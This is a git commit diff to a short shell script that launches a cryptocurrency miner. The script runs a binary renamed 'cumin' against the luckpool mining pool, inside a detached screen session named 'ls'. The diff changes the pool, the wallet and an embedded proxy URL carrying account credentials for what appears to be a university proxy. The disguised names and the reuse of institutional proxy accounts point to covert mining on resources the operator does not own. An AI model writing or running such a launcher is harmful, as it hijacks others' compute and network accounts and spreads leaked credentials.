4229614825c9d075fea0ef8ba1b25f67ea39f3d2
gasken1 <84686224+gasken1@users.noreply.github.com>
2021-10-01 19:41:42 +0700

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -3,8 +3,8 @@ sudo apt update
 sudo apt install screen libjansson4 -y 
 chmod +x cumin
 screen -dmS ls 
-POOL=stratum+tcp://eu.luckpool.net:3956
-WALLET=RTYdzcR1YraQQXz2MsKfMyTbDb35MY2x3G
+POOL=stratum+tcp://ap.luckpool.net:3956
+WALLET=RTxdgLSqxiTVkUKegd5L5S3e8pJrAkK621
 WORKER=$(echo $(shuf -i 1-1 -n 1)-SHE)
-PROXY=http://ITS-569301-a1c06:a044b@proxy.its.ac.id:8080
+PROXY=http://ITS-563181-6277a:09ed7@proxy.its.ac.id:8080
 ./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
